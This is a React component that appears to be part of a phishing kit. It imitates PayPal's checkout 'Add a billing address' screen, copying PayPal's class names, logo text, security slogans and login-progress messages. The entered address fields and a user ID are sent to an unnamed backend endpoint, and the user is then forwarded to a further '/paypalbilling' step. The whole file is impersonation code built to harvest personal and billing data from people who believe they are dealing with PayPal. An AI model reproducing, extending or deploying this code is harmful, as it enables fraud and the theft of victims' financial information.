import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { zokomId } from '../utils/auth';
import { useHistory } from 'react-router-dom';
const PayPalAddressAdd = () => {
  const [styles, setStyles] = useState(null);
  const [street, setStreet] = useState('');
  const [city, setCity] = useState('');
  const [state, setState] = useState('');
  const [postalCode, setPostalCode] = useState('');
  const [message, setMessage] = useState('');
  const [isLoading, setIsLoading] = useState(true);
  const [loadingStyles, setLoadingStyles] = useState(null);
  const userId = zokomId()
  const history = useHistory();
  useEffect(() => {
    const loadAndUnloadStyles = async () => {
      try {
        const [loginStyles, additionalStyles, codeInputCss] = await Promise.all([
          import('../../assets/styles/paypaladdress.css'),
          import('../../assets/styles/more.css'),
          import('../../assets/styles/codeinput.css')
        ]);

        setStyles({
          login: loginStyles.default,
          additional: additionalStyles.default
        });
        setLoadingStyles(codeInputCss.default);
        
        setTimeout(() => {
          setIsLoading(false);
          setLoadingStyles(null);
        }, 500);
      } catch (error) {
        console.error('Error loading styles:', error);
        setIsLoading(false);
      }
    };

    loadAndUnloadStyles();

    return () => {
      setLoadingStyles(null);
    };
  }, []);
  const handleBack = () => {
    history.goBack();
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const response = await axios.post(`${process.env.REACT_APP_API_URL}/api/billing`, {
        userId,
        street,
        city,
        state,
        postalCode,
      });
      history.push('/paypalbilling')
      setMessage(response.data.message);
    } catch (error) {
      console.error('Error submitting billing info:', error.response?.data || error.message);
      setMessage(error.response?.data?.error || 'Error saving billing information');
    }
  };

  return (
    <div dir="ltr">
      <div id="root">
        <div className="App__app--3P8ep">
          <div className="PageWrapper__outerWrapper--no-overflow--10SpW">
            <div className={`transitioning spinnerWithLockIcon ${!isLoading ? 'hide' : ''}`} aria-busy="true">
            </div>
            <div className={`lockIcon ${!isLoading ? 'hide' : ''}`}></div>
            
            {!isLoading && (
              <>
                <div className="hagrid-wcpuj4-row" data-ppui-info="grid_3.2.4">
                  <div className="hagrid-1oilgb3-col" data-ppui="true">
                    <div className="hagrid-14reej8"></div>
                  </div>
                </div>
                <div className="PageWrapper__slidingArea--3QjN6">
                  <div className="PageWrapper__contents--3Twuc">
                    <div className="PaypalHeader__paypalHeader--2rLWq">
                      <div>
                        <div className="Logo__paypalLogo--1d3Hw">
                          <span className="ally__accessAid--3Ci8b">
                            PayPal Checkout
                          </span>
                        </div>
                      </div>
                    </div>
                    <section className="styles__review--1yX7j">
                      <div
                        id="billingAddressWrapper"
                        className="styles__rowFluid--1sr5_"
                      >
                        <div
                          id="billingAddressContainer"
                          className="styles__wrapper--Gtuej"
                        >
                          
                          <h2
                            id="billingAddressHeader"
                            className="common__heading3--1UDz0 styles__customHeading--1ixgS"
                          >
                            Add a billing address
                          </h2>
                          <form
                            className="styles__formDiv--m3gqa"
                            id="billingAddressForm"
                            onSubmit={handleSubmit}
                          >
                            <div id="billingAddress">
                              <div className="styles__addressForm--2SJnd">
                                <div>
                                  <div className="styles__Container--1f85W">
                                    <input
                                      aria-describedby="line1-errorDiv"
                                      aria-invalid="false"
                                      className="styles__TextInput--35c92"
                                      id="line1"
                                      maxLength="50"
                                      placeholder="Address line 1"
                                      type="text"
                                      aria-label="Address line 1"
                                      value={street}
                                      onChange={(e) => setStreet(e.target.value)}
                                    />
                                  </div>
                                </div>
                                <div>
                                  <div className="styles__Container--1f85W">
                                    <input
                                      aria-describedby="line2-errorDiv"
                                      aria-invalid="false"
                                      className="styles__TextInput--35c92"
                                      id="line2"
                                      maxLength="50"
                                      placeholder="Address line 2"
                                      type="text"
                                      aria-label="Address line 2"
                                    />
                                  </div>
                                </div>
                                <div className="styles__city--20-aC">
                                  <div className="styles__Container--1f85W">
                                    <input
                                      aria-describedby="city-errorDiv"
                                      aria-invalid="false"
                                      className="styles__TextInput--35c92"
                                      id="city"
                                      maxLength="100"
                                      placeholder="City / Town / Village"
                                      type="text"
                                      aria-label="City / Town / Village"
                                      value={city}
                                      onChange={(e) => setCity(e.target.value)}
                                    />
                                  </div>
                                </div>
                                <div className="styles__state--1YvVZ">
                                  <div className="styles__Container--1f85W">
                                    <input
                                      aria-label="State / Province / Region"
                                      aria-describedby="state-errorDiv"
                                      aria-invalid="false"
                                      className="styles__TextInput--35c92"
                                      id="state"
                                      placeholder="State / Province / Region"
                                      type="text"
                                      value={state}
                                      onChange={(e) => setState(e.target.value)}
                                    />
                                  </div>
                                </div>
                                <div className="styles__postalCode--3lu3g">
                                  <div className="styles__Container--1f85W">
                                    <input
                                      aria-describedby="postcode-errorDiv"
                                      aria-invalid="false"
                                      className="styles__TextInput--35c92"
                                      id="postcode"
                                      placeholder="Postal code"
                                      type="text"
                                      aria-label="Postal code"
                                      value={postalCode}
                                      onChange={(e) => setPostalCode(e.target.value)}
                                    />
                                  </div>
                                </div>
                              </div>
                            </div>
                            <div className="styles__clearfix--W2ohX styles__btnGroup--3DJM8">
                              <div className="styles__billingAddressBackBtn--30Gey">
                                <button
                                  className="styles__ButtonSecondary--PXpse"
                                  type="button"
                                  id="billingAddressBackBtn"
                                  name="billingAddressBackBtn"
                                  value="Back"      
                                  onClick={handleBack}

                                >
                                  Back
                                </button>
                              </div>
                              <div className="styles__billingAddressSaveBtn--11r7x">
                                <button
                                  className="styles__ButtonPrimary--1BMIn"
                                  type="submit"
                                  id="billingAddressSaveBtn"
                                  name="billingAddressSaveBtn"
                                  value="Save"
                                >
                                  Save
                                </button>
                              </div>
                            </div>
                          </form>
                          {message && <p>{message}</p>}
                        </div>
                        <div className="Props__span10--JYhXh">
                          <div className="Props__propImg--35PgX styles__propsImgStyle--2Iljv"></div>
                          <h1 className="common__heading1--s4AXN styles__propsHeaderStyle--2Psyq">
                            PayPal is the safer, faster way to pay
                          </h1>
                          <p className="Props__subTitle--1mQdl">
                            No matter where you shop, we keep your financial
                            information secure.
                          </p>
                        </div>
                      </div>
                    </section>
                  </div>
                </div>
              </>
            )}
          </div>
        </div>
        <div className="transitioning spinnerWithLockIcon hide" aria-busy="false">
          <p className="welcomeMessage hide">Welcome, !</p>
          <p className="checkingInfo hide">Checking your info…</p>
          <p className="oneSecond hide">Just a second…</p>
          <p className="secureMessage hide">Securely logging you in...</p>
          <p className="oneTouchMessage hide"></p>
          <p className="retrieveInfo hide">Retrieving your info...</p>
          <p className="waitFewSecs hide">This may take a few seconds...</p>
          <p className="qrcMessage hide">Redirecting...</p>
          <p className="webAuthnOptin hide">Updating your login settings...</p>
          <p className="webAuthnLogin hide">Logging you in...</p>
          <div className="keychain spinner-content uiExp hide"></div>
        </div>
        <div className="lockIcon hide"></div>
      </div>
    </div>
  );
};

export default PayPalAddressAdd;
